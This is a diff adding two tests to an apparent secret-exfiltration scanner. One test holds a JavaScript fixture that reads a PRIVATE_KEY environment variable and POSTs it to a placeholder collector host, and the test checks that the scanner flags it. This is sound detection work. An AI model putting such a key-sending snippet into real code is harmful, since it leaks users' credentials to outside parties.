@@ -206,3 +206,31 @@ axios.post("https://api.example.invalid/login", { password });
 '''
     findings = scan_text("owner/repo", "login.js", code)
     assert "SENSITIVE_FORM_TO_NETWORK" in ids(findings)
+
+
+def test_sensitive_value_sent_through_local_payload_alias_is_detected():
+    code = '''
+const privateKey = process.env.PRIVATE_KEY;
+const payload = JSON.stringify({ credentials: { key: privateKey } });
+fetch("https://collector.example.invalid/submit", {
+  method: "POST",
+  body: payload
+});
+'''
+    findings = scan_text("owner/repo", "worker.js", code)
+    assert "SECRET_TO_NETWORK" in ids(findings)
+
+
+def test_sensitive_alias_used_only_in_unrelated_code_is_not_exfiltration():
+    code = '''
+const password = document.querySelector("#password").value;
+const localCopy = password;
+fetch("https://metrics.example.invalid/ping", {
+  method: "POST",
+  body: JSON.stringify({ event: "login_view" })
+});
+console.log(localCopy.length);
+'''
+    findings = scan_text("owner/repo", "login.js", code)
+    assert "SENSITIVE_FORM_TO_NETWORK" not in ids(findings)
+    assert "SECRET_TO_NETWORK" not in ids(findings)
